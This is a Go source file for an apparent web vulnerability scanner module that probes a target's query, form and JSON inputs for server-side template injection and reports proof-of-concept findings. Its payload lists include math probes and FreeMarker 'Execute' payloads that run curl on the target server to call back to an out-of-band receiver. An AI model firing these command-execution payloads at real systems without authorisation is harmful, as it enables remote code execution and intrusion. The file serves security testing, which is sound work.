package core

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

type SSTIPayloadType string

const (
	SSTIMath SSTIPayloadType = "math"
	SSTIOOB  SSTIPayloadType = "oob"
)

type SSTIPayload struct {
	Type     SSTIPayloadType
	Value    string
	Expected string
	OOBID    string
}

type SSTIValidator struct{}

func (v *SSTIValidator) IsVulnerable(body string, payload SSTIPayload, oobHits []OOBInteraction) bool {
	if payload.Type == SSTIMath {
		// Vulnerable if body contains the evaluated math result, but NOT the literal template string
		if strings.Contains(body, payload.Expected) && !strings.Contains(body, payload.Value) {
			return true
		}
		return false
	} else if payload.Type == SSTIOOB {
		return len(oobHits) > 0
	}
	return false
}

// ServerSideTemplateInjectionSstiResult holds the result of the ServerSideTemplateInjectionSsti module execution.
type ServerSideTemplateInjectionSstiResult struct {
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

// ServerSideTemplateInjectionSsti executes the server_side_template_injection_ssti security technique.
type ServerSideTemplateInjectionSsti struct {
	BaseModule
	Target  string
	results []ServerSideTemplateInjectionSstiResult
	OOB     *OOBManager
}

// NewServerSideTemplateInjectionSsti creates a new instance.
func NewServerSideTemplateInjectionSsti(target string) *ServerSideTemplateInjectionSsti {
	return &ServerSideTemplateInjectionSsti{
		BaseModule: BaseModule{
			Client:     NewHTTPClient(10 * time.Second),
			MaxThreads: 5,
		},
		Target: EnsureHTTPPrefix(target),
	}
}

func (m *ServerSideTemplateInjectionSsti) SetThreads(count int) {
	if count < 1 {
		count = 1
	}
	m.MaxThreads = count
}

func (m *ServerSideTemplateInjectionSsti) Execute(ctx context.Context) ([]ServerSideTemplateInjectionSstiResult, error) {
	m.Mu.Lock()
	m.results = make([]ServerSideTemplateInjectionSstiResult, 0)
	m.Mu.Unlock()

	parsedURL, err := url.Parse(m.Target)
	if err != nil {
		return m.results, err
	}

	req, err := http.NewRequestWithContext(ctx, "GET", m.Target, nil)
	if err != nil {
		return m.results, err
	}

	vectors, _ := m.DiscoverVectors(parsedURL, nil, "", req.Header)
	hasQueryOrBody := false
	for _, v := range vectors {
		if v.Type == VectorQueryParam || v.Type == VectorFormBody || v.Type == VectorJSONBody {
			hasQueryOrBody = true
			break
		}
	}

	if !hasQueryOrBody {
		vectors = append(vectors, InputVector{Type: VectorQueryParam, Key: "q", Value: ""})
		vectors = append(vectors, InputVector{Type: VectorQueryParam, Key: "name", Value: ""})
		vectors = append(vectors, InputVector{Type: VectorQueryParam, Key: "template", Value: ""})
	}

	var payloads []SSTIPayload
	mathPayloads := []struct{ val, expected string }{
		{"{{4444*4444}}", "19749136"},
		{"${4444*4444}", "19749136"},
		{"<%= 4444*4444 %>", "19749136"},
		{"#{4444*4444}", "19749136"},
		{"*{4444*4444}", "19749136"},
	}
	for _, p := range mathPayloads {
		payloads = append(payloads, SSTIPayload{Type: SSTIMath, Value: p.val, Expected: p.expected})
	}

	if m.OOB != nil {
		oobPayloads := []string{
			"{{req('%%OOB_URL%%')}}",
			"${\"freemarker.template.utility.Execute\"?new()(\"curl %%OOB_URL%%\")}",
			"<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"curl %%OOB_URL%%\") }",
		}
		for _, p := range oobPayloads {
			payloads = append(payloads, SSTIPayload{Type: SSTIOOB, Value: p})
		}
	}

	type job struct {
		vector  InputVector
		payload SSTIPayload
	}

	jobChan := make(chan job, len(vectors)*len(payloads))
	for _, v := range vectors {
		for _, p := range payloads {
			jobChan <- job{vector: v, payload: p}
		}
	}
	close(jobChan)

	var wg sync.WaitGroup
	validator := &SSTIValidator{}

	for i := 0; i < m.MaxThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := range jobChan {
				select {
				case <-ctx.Done():
					return
				default:
					m.testVector(ctx, parsedURL, j.vector, j.payload, validator)
				}
			}
		}()
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		return m.results, nil
	case <-ctx.Done():
		<-done
		return m.results, ctx.Err()
	}
}

func (m *ServerSideTemplateInjectionSsti) testVector(ctx context.Context, u *url.URL, vector InputVector, payload SSTIPayload, validator *SSTIValidator) {
	var req *http.Request
	var err error

	if payload.Type == SSTIOOB && m.OOB != nil {
		oobHost, oobID := m.OOB.GenerateOOBPayload()
		if oobHost != "" {
			if !strings.HasPrefix(oobHost, "http://") && !strings.HasPrefix(oobHost, "https://") {
				oobHost = "http://" + oobHost
			}
			payload.Value = strings.ReplaceAll(payload.Value, "%%OOB_URL%%", oobHost)
			payload.OOBID = oobID
		}
	}

	testValue := vector.Value + payload.Value

	method := "GET"
	if vector.Type == VectorFormBody || vector.Type == VectorJSONBody {
		method = "POST"
	}

	req, err = m.BaseModule.BuildRequestWithVector(ctx, method, u, vector, testValue)
	if err != nil || req == nil {
		return
	}

	resp, err := m.Client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}
	bodyStr := string(bodyBytes)

	var oobHits []OOBInteraction
	if payload.Type == SSTIOOB && m.OOB != nil {
		timeout := time.After(5 * time.Second)
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
	pollLoop:
		for {
			select {
			case <-ctx.Done():
				break pollLoop
			case <-timeout:
				break pollLoop
			case <-ticker.C:
				oobHits = m.OOB.GetInteractions(payload.OOBID)
				if len(oobHits) > 0 {
					break pollLoop
				}
			}
		}
	}

	if validator.IsVulnerable(bodyStr, payload, oobHits) {
		m.Mu.Lock()
		detail := fmt.Sprintf("SSTI (%s) successful in %s '%s' using payload: %s", payload.Type, vector.Type, vector.Key, payload.Value)
		if payload.Type == SSTIMath {
			detail += " (Result: " + payload.Expected + ")"
		}
		m.RecordPoC(req, nil, detail)
		m.results = append(m.results, ServerSideTemplateInjectionSstiResult{
			Target: m.Target,
			Status: "vulnerable",
			Detail: detail,
		})
		m.Mu.Unlock()
	}
}

func init() {
	RegisterModule("server_side_template_injection_ssti", func(payload map[string]any, onLog func(string)) (ExecutableModule, error) {

		target := PayloadString(payload, "url", "http://127.0.0.1")
		onLog(fmt.Sprintf("Starting ServerSideTemplateInjectionSsti on: %s", target))

		tester := NewServerSideTemplateInjectionSsti(target)
		tester.SetThreads(PayloadInt(payload, "threads", 5))

		// Initialize OOB Manager for SSTI
		return ModuleWrapper{
			Module: tester,
			ExecuteFunc: func(ctx context.Context) (any, error) {
				oob := &OOBManager{}
				if err := oob.StartOOBReceiver("127.0.0.1:0"); err == nil {
					onLog(fmt.Sprintf("OOB Receiver started on %s", oob.Listener.Addr().String()))
					tester.OOB = oob
					defer oob.StopOOBReceiver()
				} else {
					onLog(fmt.Sprintf("Warning: Failed to start OOB Receiver: %v. Proceeding with in-band only.", err))
				}
				return tester.Execute(ctx)
			},
		}, nil
	})
}
